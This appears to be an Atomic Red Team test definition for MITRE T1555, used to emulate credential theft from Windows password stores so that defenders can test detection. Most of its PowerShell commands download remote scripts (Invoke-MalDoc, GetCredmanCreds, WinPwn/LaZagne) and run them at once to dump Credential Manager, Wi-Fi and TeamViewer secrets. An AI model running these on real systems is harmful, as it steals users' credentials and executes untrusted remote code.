{
  "attack_technique": "T1555",
  "display_name": "Credentials from Password Stores",
  "atomic_tests": [
    {
      "name": "Extract Windows Credential Manager via VBA",
      "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
        "cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore"
      },
      "input_arguments": {},
      "dependencies": [
        {
          "description": "Microsoft Word must be installed",
          "prereq_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\""
        }
      ],
      "auto_generated_guid": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b"
    },
    {
      "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
      "description": "This module will extract the credentials from Windows Credential Manager",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force"
      },
      "input_arguments": {},
      "auto_generated_guid": "c89becbe-1758-4e7d-a0f4-97d2188a23e3"
    },
    {
      "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
      "description": "This module will extract the credentials from Windows Credential Manager",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force"
      },
      "input_arguments": {},
      "auto_generated_guid": "8fd5a296-6772-4766-9991-ff4e92af7240"
    },
    {
      "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]",
      "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "vaultcmd /listcreds:\"Windows Credentials\" /all"
      },
      "input_arguments": {},
      "auto_generated_guid": "36753ded-e5c4-4eb5-bc3c-e8fba236878d"
    },
    {
      "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]",
      "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "vaultcmd /listcreds:\"Web Credentials\" /all"
      },
      "input_arguments": {},
      "auto_generated_guid": "bc071188-459f-44d5-901a-f8f2625b2d2e"
    },
    {
      "name": "WinPwn - Loot local Credentials - lazagne",
      "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive"
      },
      "input_arguments": {},
      "auto_generated_guid": "079ee2e9-6f16-47ca-a635-14efcd994118"
    },
    {
      "name": "WinPwn - Loot local Credentials - Wifi Credentials",
      "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive"
      },
      "input_arguments": {},
      "auto_generated_guid": "afe369c2-b42e-447f-98a3-fb1f4e2b8552"
    },
    {
      "name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords",
      "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive"
      },
      "input_arguments": {},
      "auto_generated_guid": "db965264-3117-4bad-b7b7-2523b7856b92"
    }
  ]
}